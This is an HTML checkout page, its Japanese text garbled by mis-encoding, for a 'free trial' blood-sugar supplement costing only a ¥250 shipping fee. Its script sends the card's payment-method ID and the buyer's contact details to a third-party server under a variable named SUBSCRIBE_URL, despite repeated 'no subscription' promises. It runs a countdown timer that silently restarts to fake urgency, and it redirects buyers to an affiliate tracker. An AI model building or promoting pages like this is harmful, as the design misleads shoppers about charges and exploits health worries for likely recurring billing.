<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GlucoNova â€¢ ã‚°ãƒ«ã‚³ãƒ¼ã‚¹ç®¡ç† ç„¡æ–™ãƒˆãƒ©ã‚¤ã‚¢ãƒ«</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
<style>
  :root{
    --brand:#e11d2a;
    --brand-2:#0177ff;
    --accent:#22a559;
    --ink:#0b1220;
    --muted:#5b6472;
    --line:#e5e7eb;
    --radius:18px;
    --product-bg:#F2F2F2; /* ãƒœãƒˆãƒ«ç”»åƒã®èƒŒæ™¯ã«åˆã‚ã›ã‚‹ */
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
    color:var(--ink);
    background: radial-gradient(1200px 600px at 10% -10%, #fff0f1 0%, #ffffff 50%, #f4f9ff 100%);
  }

  /* ã•ã‚Šã’ãªã„ã‚¹ãƒ‘ãƒ¼ã‚¯ãƒ« */
  .sparkles{position:absolute;inset:0;pointer-events:none;overflow:hidden}
  .sparkles i{position:absolute;width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.9);box-shadow:0 0 20px rgba(225,29,42,.65),0 0 8px rgba(1,119,255,.35);animation:float 8s linear infinite}
  .sparkles i:nth-child(2){width:8px;height:8px;animation-duration:10s;left:15%}
  .sparkles i:nth-child(3){width:5px;height:5px;animation-duration:12s;left:70%}
  .sparkles i:nth-child(4){width:7px;height:7px;animation-duration:9s;left:85%}
  @keyframes float{0%{transform:translateY(120%)}100%{transform:translateY(-20%)}}

  /* ãƒªãƒœãƒ³ */
  .ribbon{background:linear-gradient(90deg,var(--brand),#ff6a88);color:#fff;font-weight:900;text-transform:uppercase;letter-spacing:.3px;position:relative;z-index:2}
  .ribbon .wrap{display:flex;align-items:center;gap:14px;padding:10px 16px;max-width:1200px;margin:0 auto}
  .pill{background:rgba(255,255,255,.18);padding:5px 12px;border-radius:999px;border:1px solid rgba(255,255,255,.45)}
  .timer{margin-left:auto;display:flex;gap:18px;font-weight:900}
  .timer span{display:flex;gap:6px;align-items:center}

  /* ãƒ’ãƒ¼ãƒ­ãƒ¼ */
  .hero{position:relative;border-bottom:1px solid var(--line);}
  .hero .wrap{max-width:1200px;margin:0 auto;padding:34px 16px;display:grid;grid-template-columns:1.15fr 1fr;gap:28px;align-items:center}
  .brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:40px;letter-spacing:.2px}
  .logoDot{width:30px;height:30px;border-radius:50%;background:var(--brand);position:relative;box-shadow:0 10px 30px rgba(225,29,42,.25)}
  .logoDot:after{content:"";position:absolute;inset:6px 10px 6px 6px;border-radius:46% 14% 46% 46%/46% 14% 46% 46%;background:#fff;transform:rotate(-35deg)}
  .hero h1{font-size:38px;margin:14px 0 10px}
  .sub{font-size:18px;color:#2b3340}
  .badges{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center;box-shadow:0 8px 26px rgba(1,119,255,.06)}
  .badge b{display:block;margin-top:6px}
  .product-hero{min-height:300px;border-radius:22px;border:1px solid var(--line);background:var(--product-bg) url('gluco.jpg') center/contain no-repeat;box-shadow:0 18px 50px rgba(1,119,255,.08)}

  /* ã‚­ãƒ£ãƒƒãƒå¸¯ */
  .flash{margin-top:16px;display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:12px;background:linear-gradient(90deg,rgba(1,119,255,.12),rgba(225,29,42,.12));backdrop-filter:saturate(140%)}
  .flash strong{color:var(--brand)}

  /* ãƒ¡ã‚¤ãƒ³ */
  .main{max-width:1200px;margin:0 auto;padding:24px 16px;display:grid;grid-template-columns:1fr 420px;gap:24px}
  @media (max-width:1000px){.hero .wrap{grid-template-columns:1fr}.main{grid-template-columns:1fr}}

  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 8px 24px rgba(2,18,8,.06)}
  .card .pad{padding:18px}

  /* ã‚ªãƒ•ã‚¡ãƒ¼ */
  .offer{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
  @media (max-width:720px){.offer{grid-template-columns:1fr}}
  .tile{border:2px solid var(--line);border-radius:16px;padding:16px;position:relative}
  .tile.pop{border-color:var(--brand);box-shadow:0 0 0 4px rgba(225,29,42,.12)}
  .tile h4{margin:2px 0 6px}
  .price{font-size:28px;font-weight:900;color:var(--accent)}
  .strike{color:#96a0ad;text-decoration:line-through;font-weight:700}
  .rtag{position:absolute;top:12px;left:12px;background:var(--brand-2);color:#fff;font-size:12px;padding:5px 10px;border-radius:999px}

  /* ãƒã‚§ãƒƒã‚¯ã‚¢ã‚¦ãƒˆ */
  .checkout .head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);padding:14px 18px}
  .checkout h3{margin:0;font-size:20px}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .row > *{min-width:0}

  .phone{display:flex;gap:10px;width:100%}
  .phone select{flex:0 0 170px}
  .phone input{flex:1 1 0%;min-width:0;width:100%}

  .input,.el,select{width:100%;display:block;padding:12px 14px;border:1.6px solid var(--line);border-radius:12px;background:#fff;color:#000}
  .input:focus,.el:focus,select:focus{outline:none;border-color:#ffd7e8;box-shadow:0 0 0 3px rgba(225,29,42,.18)}

  .paybtn{width:100%;padding:16px 18px;border-radius:14px;background:linear-gradient(180deg,var(--brand),#b3131f);color:#fff;font-weight:900;border:none;cursor:pointer;box-shadow:0 14px 30px rgba(225,29,42,.25)}
  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
  .muted{color:var(--muted);font-size:14px}
  .trust{display:flex;gap:14px;justify-content:center;padding:12px;border-top:1px solid var(--line)}
  .trust img{height:22px;opacity:.85}

  .list{display:grid;gap:10px;margin-top:6px}
  .list .li{display:flex;gap:10px}
  .check{width:18px;height:18px;border-radius:4px;background:#ffe5e8;display:inline-flex;align-items:center;justify-content:center}
  .check:after{content:"âœ“";font-size:12px;color:var(--brand)}

  .notice{border:1px dashed #ffb3bc;background:#fff8f9;color:#7a0b16;padding:10px 12px;border-radius:12px}

  details{border:1px solid var(--line);border-radius:12px;padding:12px 14px}
  details+details{margin-top:10px}
  summary{cursor:pointer;font-weight:700}

  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
  .overlay[aria-hidden="false"]{display:flex}
  .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
  .bar{height:10px;width:100%;background:#eef2f5;border-radius:999px;overflow:hidden;margin-top:10px}
  .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),#ff9ec5);animation:load 2.2s ease-in-out infinite;border-radius:inherit}
  @keyframes load{0%{width:0%}60%{width:85%}100%{width:100%}}

  #err{margin-top:10px;font-size:14px;color:#b00020;background:#fde9eb;border:1px solid #e5b2b8;border-radius:10px;padding:8px;display:none}
  #err[aria-hidden="false"]{display:block}

  footer{padding:30px 16px;color:#3b4450;border-top:1px solid var(--line);text-align:center}
</style>
</head>
<body>
  <!-- ä¸Šéƒ¨ãƒªãƒœãƒ³ -->
  <div class="ribbon">
    <div class="wrap">
      <div><span class="pill">ç„¡æ–™ãƒˆãƒ©ã‚¤ã‚¢ãƒ«é–‹å§‹</span> åˆå›ãƒœãƒˆãƒ«ã¯ç„¡æ–™ã§ãƒ—ãƒ¬ã‚¼ãƒ³ãƒˆ</div>
      <div class="timer" aria-live="polite">
        <span><strong id="hh">00</strong> æ™‚</span>
        <span><strong id="mm">15</strong> åˆ†</span>
        <span><strong id="ss">00</strong> ç§’</span>
      </div>
    </div>
  </div>

  <!-- ãƒ’ãƒ¼ãƒ­ãƒ¼ -->
  <section class="hero">
    <div class="sparkles" aria-hidden="true">
      <i style="left:5%"></i><i></i><i></i><i></i>
    </div>
    <div class="wrap">
      <div>
        <div class="brand"><span class="logoDot"></span> GlucoNova</div>
        <h1>ã‚°ãƒ«ã‚³ãƒ¼ã‚¹ç®¡ç† â€” ç„¡æ–™ãƒˆãƒ©ã‚¤ã‚¢ãƒ«ãƒœãƒˆãƒ«*</h1>
        <p class="sub">ãŠæ”¯æ‰•ã„ã¯ <b>Â¥250</b> ã®é…é€æ–™ã®ã¿ã€‚<b>éš ã‚ŒãŸæ–™é‡‘ãªã—ã€‚</b> ã‚µãƒ–ã‚¹ã‚¯ãªã—ã€‚è£½å“ã«è‡ªä¿¡ãŒã‚ã‚‹ã‹ã‚‰ã“ãã€ãã£ã¨ã¾ãŸé¸ã‚“ã§ã„ãŸã ã‘ã‚‹ã¨ä¿¡ã˜ã¦ã„ã¾ã™ã€‚</p>
        <div class="flash"><strong>ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ï¼š</strong> å¥ã‚„ã‹ãªè¡€ç³–å€¤ã€é£Ÿæ¬²ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã€å®‰å®šã—ãŸã‚¨ãƒãƒ«ã‚®ãƒ¼ã€ä½“é‡ç®¡ç† â€” æ¯æ—¥ã‚’ã‚ˆã‚Šå¿«é©ã«ã€‚</div>
        <div class="badges">
          <div class="badge">âš–ï¸ <b>ä½“é‡ç®¡ç†ã®ã‚µãƒãƒ¼ãƒˆ</b></div>
          <div class="badge">ğŸ©¸ <b>å¥ã‚„ã‹ãªè¡€ç³–å€¤</b></div>
          <div class="badge">âš¡ <b>å®‰å®šã—ãŸã‚¨ãƒãƒ«ã‚®ãƒ¼</b></div>
          <div class="badge">â¤ï¸ <b>å¿ƒè¡€ç®¡ã®å¥åº·ã‚’ã‚µãƒãƒ¼ãƒˆ</b></div>
        </div>
      </div>
      <div class="product-hero" role="img" aria-label="GlucoNova ã‚°ãƒ«ã‚³ãƒ¼ã‚¹ç®¡ç† ãƒœãƒˆãƒ«"></div>
    </div>
  </section>

  <!-- ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ -->
  <section class="main">
    <!-- å·¦ï¼šã‚ªãƒ•ã‚¡ãƒ¼/åˆ©ç‚¹ -->
    <div class="card">
      <div class="pad">
        <div class="offer">
          <div class="tile pop">
            <span class="rtag">ç„¡æ–™ãƒˆãƒ©ã‚¤ã‚¢ãƒ«</span>
            <h4>1æœ¬ GlucoNova ã‚°ãƒ«ã‚³ãƒ¼ã‚¹ç®¡ç†ï¼ˆ60ã‚«ãƒ—ã‚»ãƒ«ï¼‰</h4>
            <div class="strike">Â¥3,995</div>
            <div class="price">æœ¬æ—¥ Â¥0</div>
            <p class="muted">ãŠæ”¯æ‰•ã„ã¯ <b>Â¥250</b> ã®é…é€æ–™ã®ã¿ â€” ãã‚Œã ã‘ã§ã™ã€‚</p>
          </div>
          <div class="tile">
            <h4>ãªãœç„¡æ–™ï¼Ÿ</h4>
            <p>ç§ãŸã¡ã¯å‡¦æ–¹ã«è‡ªä¿¡ãŒã‚ã‚Šã¾ã™ã€‚é…é€è²»ã ã‘ã§ã€é€šå¸¸ã‚µã‚¤ã‚ºã‚’ãŠè©¦ã—ãã ã•ã„ã€‚å®šæœŸèª²é‡‘ã‚„éš ã‚ŒãŸè²»ç”¨ã¯ä¸€åˆ‡ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
          </div>
          <div class="tile">
            <h4>é€æ˜æ€§ã®ç´„æŸ</h4>
            <div class="list">
              <div class="li"><span class="check"></span><div><b>é…é€æ–™ã¯ä¸€åº¦ã ã‘</b>ï¼ˆÂ¥250ï¼‰</div></div>
              <div class="li"><span class="check"></span><div><b>ã‚µãƒ–ã‚¹ã‚¯ç™»éŒ²ãªã—</b> æ³¨æ–‡ã«è‡ªå‹•è¿½åŠ ã¯ã‚ã‚Šã¾ã›ã‚“</div></div>
              <div class="li"><span class="check"></span><div><b>30æ—¥æº€è¶³ä¿è¨¼</b> ã”æº€è¶³ã„ãŸã ã‘ãªã„å ´åˆã¯é…é€æ–™ã‚’è¿”é‡‘</div></div>
            </div>
          </div>
        </div>

        <div class="card" style="margin-top:14px">
          <div class="pad">
            <h3>ã‚°ãƒ«ã‚³ãƒ¼ã‚¹ç®¡ç†ãŒå½¹ç«‹ã¤ç†ç”±</h3>
            <div class="list">
              <div class="li"><span class="check"></span><div><b>å¥åº·çš„ãªç³–ä»£è¬ã‚’ã‚µãƒãƒ¼ãƒˆ</b>â€” 1æ—¥1å›ã®æ‰‹è»½ãªã‚«ãƒ—ã‚»ãƒ«ã§ã€‚*</div></div>
              <div class="li"><span class="check"></span><div><b>é–“é£Ÿæ¬²æ±‚ã®æŠ‘åˆ¶ã‚’ã‚µãƒãƒ¼ãƒˆ</b>â€” ã‚«ãƒ­ãƒªãƒ¼ç®¡ç†ã‚’ãƒ©ã‚¯ã«ã€‚*</div></div>
              <div class="li"><span class="check"></span><div><b>ä¸€æ—¥ã‚’é€šã˜ãŸå®‰å®šæ„Ÿ</b>â€” ãƒãƒ©ãƒ³ã‚¹ã®å–ã‚ŒãŸã‚¨ãƒãƒ«ã‚®ãƒ¼ã‚’ã€‚*</div></div>
              <div class="li"><span class="check"></span><div><b>ã‚¯ãƒªãƒ¼ãƒ³å‡¦æ–¹</b>â€” ééºä¼å­çµ„ã¿æ›ãˆã€GMPæº–æ‹ æ–½è¨­ã§è£½é€ ã€‚</div></div>
            </div>
            <p class="notice" role="note">*æœ¬å“ã¯ä¸€èˆ¬çš„ãªã‚¦ã‚§ãƒ«ãƒã‚¹ã‚’ç›®çš„ã¨ã—ãŸã‚µãƒãƒ¼ãƒˆã§ã‚ã‚Šã€åŒ»è–¬å“ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã„ã‹ãªã‚‹ä¿å¥å½“å±€ã«ã‚ˆã‚‹è©•ä¾¡ã‚‚å—ã‘ã¦ã„ã¾ã›ã‚“ã€‚ç–¾ç—…ã®è¨ºæ–­ãƒ»æ²»ç™‚ãƒ»æ²»ç™’ãƒ»äºˆé˜²ã‚’ç›®çš„ã¨ã™ã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
          </div>
        </div>

        <div class="card" style="margin-top:14px">
          <div class="pad">
            <h3>ã‚ˆãã‚ã‚‹è³ªå•</h3>
            <details>
              <summary>æœ¬å½“ã«ç„¡æ–™ã§ã™ã‹ï¼Ÿ</summary>
              <p>ã¯ã„ã€‚åˆå›ãƒœãƒˆãƒ«ã¯ç„¡æ–™ã§ã™ã€‚ãŠæ”¯æ‰•ã„ã¯ä¸€åº¦ãã‚Šã® <b>Â¥250</b> ã®é…é€æ–™ã®ã¿ã€‚<b>éš ã‚ŒãŸæ–™é‡‘ãªã—</b>ã€<b>è‡ªå‹•é…é€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãªã—</b>ã§ã™ã€‚</p>
            </details>
            <details>
              <summary>ã©ã®ã‚ˆã†ã«é£²ã‚ã°ã‚ˆã„ã§ã™ã‹ï¼Ÿ</summary>
              <p>1æ—¥2ã‚«ãƒ—ã‚»ãƒ«ã‚’ç›®å®‰ã«ã€æ°´ã¨ä¸€ç·’ã«ã€ã§ãã‚Œã°é£Ÿäº‹ã¨ã¨ã‚‚ã«ãŠå¬ã—ä¸ŠãŒã‚Šãã ã•ã„ã€‚</p>
            </details>
            <details>
              <summary>æ¸›é‡ã«å½¹ç«‹ã¡ã¾ã™ã‹ï¼Ÿ</summary>
              <p>å¥ã‚„ã‹ãªç³–ä»£è¬ã¨é£Ÿæ¬²ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€é£Ÿäº‹ãƒ»é‹å‹•ã¨çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ã§ä½“é‡ç®¡ç†ã‚’ã—ã‚„ã™ãã—ã¾ã™ã€‚*</p>
            </details>
          </div>
        </div>
      </div>
    </div>

    <!-- å³ï¼šãƒã‚§ãƒƒã‚¯ã‚¢ã‚¦ãƒˆ -->
    <div class="card checkout" id="checkoutCard">
      <div class="head">
        <h3>ç„¡æ–™ãƒœãƒˆãƒ«ã‚’å—ã‘å–ã‚‹</h3>
        <div class="muted">å®‰å…¨ãªæ±ºæ¸ˆ</div>
      </div>
      <div class="pad">
        <div class="row" style="margin-bottom:8px">
          <input id="emailInput" class="input" type="email" placeholder="ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹"/>
          <input id="nameInput" class="input" placeholder="æ°å"/>
        </div>
        <div style="margin-bottom:8px">
          <div class="phone">
            <select id="phonePrefix" class="input" aria-label="å›½ç•ªå·"></select>
            <input id="phoneNumber" class="input" type="tel" inputmode="tel" placeholder="é›»è©±ç•ªå·"/>
          </div>
        </div>
        <div class="row" style="margin-bottom:8px">
          <input id="billingStreet" class="input" placeholder="ä½æ‰€"/>
          <input id="billingCity" class="input" placeholder="å¸‚åŒºç”ºæ‘"/>
        </div>
        <div class="row" style="margin-bottom:8px">
          <input id="billingPostcode" class="input" placeholder="éƒµä¾¿ç•ªå·"/>
          <select id="billingCountry" class="input"></select>
        </div>

        <div class="muted" style="margin:8px 0 4px">ã‚«ãƒ¼ãƒ‰ç•ªå·ï¼ˆé…é€æ–™ Â¥250ï¼‰</div>
        <div id="card-number" class="el"></div>
        <div class="row" style="margin-top:8px">
          <div>
            <div class="muted" style="margin:8px 0 4px">æœ‰åŠ¹æœŸé™</div>
            <div id="card-expiry" class="el"></div>
          </div>
          <div>
            <div class="muted" style="margin:8px 0 4px">CVC</div>
            <div id="card-cvc" class="el"></div>
          </div>
        </div>

        <div class="notice" style="margin-top:10px">
          <b>éš ã‚ŒãŸæ–™é‡‘ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</b> æœ¬æ—¥ã¯ <b>Â¥250</b>ï¼ˆé…é€æ–™ï¼‰ã®ã¿ã®ã”è«‹æ±‚ã§ã™ã€‚
        </div>

        <div id="err" role="alert" aria-hidden="true"></div>

        <button id="payNow" class="paybtn" style="margin-top:12px">ç„¡æ–™ãƒœãƒˆãƒ«ã‚’å—ã‘å–ã‚‹</button>
        <p class="muted" style="margin:10px 0 0">ğŸ”’ 256-bit SSL ã‚»ã‚­ãƒ¥ã‚¢æ±ºæ¸ˆ</p>
      </div>
      <div class="trust">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay"/>
      </div>
    </div>
  </section>

  <!-- ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚° -->
  <div id="overlay" class="overlay" aria-hidden="true">
    <div class="box">
      <h3>å‡¦ç†ä¸­â€¦</h3>
      <div class="bar"><span></span></div>
      <p class="muted">æ•°ç§’ãŠå¾…ã¡ãã ã•ã„ã€‚</p>
    </div>
  </div>

  <footer>
    <b>å…è²¬äº‹é …ï¼š</b> æœ¬ãƒšãƒ¼ã‚¸ã®è¨˜è¼‰ã¯ä¸€èˆ¬çš„ãªã‚¦ã‚§ãƒ«ãƒã‚¹ã‚µãƒãƒ¼ãƒˆã‚’ç›®çš„ã¨ã—ãŸã‚‚ã®ã§ã€ã„ãšã‚Œã®ä¿å¥å½“å±€ã«ã‚ˆã‚‹è©•ä¾¡ã‚‚å—ã‘ã¦ã„ã¾ã›ã‚“ã€‚GlucoNova è£½å“ã¯ã€ç–¾ç—…ã®è¨ºæ–­ãƒ»æ²»ç™‚ãƒ»æ²»ç™’ãƒ»äºˆé˜²ã‚’ç›®çš„ã¨ã™ã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
  </footer>

  <!-- Stripe.js -->
  <script src="https://js.stripe.com/v3"></script>
  <script>
    /* ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³ */
    (function countdownLoop(){
      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
      const DURATION_MS = 15*60*1000;
      let end = Date.now() + DURATION_MS;
      const fmt=n=>String(n).padStart(2,'0');
      (function tick(){
        const left = Math.max(0, end - Date.now());
        const s = Math.floor(left/1000)%60;
        const m = Math.floor(left/60000)%60;
        const h = Math.floor(left/3600000);
        hh.textContent=fmt(h); mm.textContent=fmt(m); ss.textContent=fmt(s);
        if(left<=0){ end = Date.now() + DURATION_MS; }
        requestAnimationFrame(tick);
      })();
    })();

    /* æ—¥æœ¬ã®ã¿ï¼ˆ+81, JPï¼‰ */
    const ALLOWED = { JP: { prefix: '+81', name: 'æ—¥æœ¬' } };

    function populateAllowed(selectEl) {
      if(!selectEl) return;
      selectEl.innerHTML = '';
      const opt = new Option(`${ALLOWED.JP.prefix} â€” ${ALLOWED.JP.name}`, ALLOWED.JP.prefix, true, true);
      opt.dataset.cc = 'JP';
      selectEl.add(opt);
    }

    function populateCountries(countrySel){
      if(!countrySel) return;
      countrySel.innerHTML = '';
      const opt = new Option('æ—¥æœ¬', 'JP', true, true);
      countrySel.add(opt);
    }

    (function initGeoUI(){
      populateAllowed(document.getElementById('phonePrefix'));
      populateCountries(document.getElementById('billingCountry'));
      const phoneEl  = document.getElementById('phoneNumber');
      if (phoneEl) { phoneEl.disabled=false; phoneEl.readOnly=false; }
    })();

    /* ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼ˆã“ã‚Œã¾ã§ã¨åŒã˜ï¼‰ */
    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";

    const stripe = Stripe(PUBLISHABLE_KEY);
    const elements = stripe.elements();
    const cardNumber=elements.create("cardNumber");
    const cardExpiry=elements.create("cardExpiry");
    const cardCvc=elements.create("cardCvc");
    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");

    const $err=document.getElementById("err");
    const overlay=document.getElementById('overlay');
    const showError=m=>{$err.textContent=m;$err.setAttribute('aria-hidden','false');}
    const hideError=()=>{$err.textContent="";$err.setAttribute('aria-hidden','true');}
    const showLoading=()=>overlay.setAttribute('aria-hidden','false');
    const hideLoading=()=>overlay.setAttribute('aria-hidden','true');

    const nameInput=document.getElementById('nameInput');
    const emailInput=document.getElementById('emailInput');
    const phoneNumber=document.getElementById('phoneNumber');
    const billingStreet=document.getElementById('billingStreet');
    const billingCity=document.getElementById('billingCity');
    const billingPostcode=document.getElementById('billingPostcode');

    document.getElementById("payNow").onclick = async () => {
      hideError(); showLoading();
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const fullPhone = rawPhone ? `+81${rawPhone}` : undefined;

      const addr = {
        line1:(billingStreet?.value||'').trim()||undefined,
        city:(billingCity?.value||'').trim()||undefined,
        postal_code:(billingPostcode?.value||'').trim()||undefined,
        country:'JP'
      };

      const pm = await stripe.createPaymentMethod({
        type:"card",
        card:cardNumber,
        billing_details:{
          name:nameInput.value||undefined,
          email:emailInput.value||undefined,
          phone:fullPhone,
          address:addr
        }
      });
      if(pm.error){ hideLoading(); showError(pm.error.message); return; }

      try{
        const res = await fetch(SUBSCRIBE_URL,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            paymentMethodId:pm.paymentMethod.id,
            name:nameInput.value,
            email:emailInput.value,
            phone:fullPhone,
            address:addr,
            amount:250 // Â¥250ï¼ˆStripeã¯JPYã®æœ€å°å˜ä½ï¼å††ï¼‰
          })
        });
        const data = await res.json();
        if(data.error){ hideLoading(); showError(data.error); return; }
        if(!data.clientSecret){ hideLoading(); showError("æ±ºæ¸ˆã«å¤±æ•—ã—ã¾ã—ãŸ"); return; }

        const conf = await stripe.confirmCardPayment(data.clientSecret);
        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
          hideLoading(); showError("æ±ºæ¸ˆãŒå®Œäº†ã—ã¦ã„ã¾ã›ã‚“"); return; }
        window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?";
      }catch(e){ hideLoading(); showError(e.message||"ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ"); }
    };
  </script>

  <!-- GoAffPro loaderï¼ˆãƒˆãƒ©ãƒƒã‚­ãƒ³ã‚°ç”¨ï¼‰ -->
  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
</body>
</html>
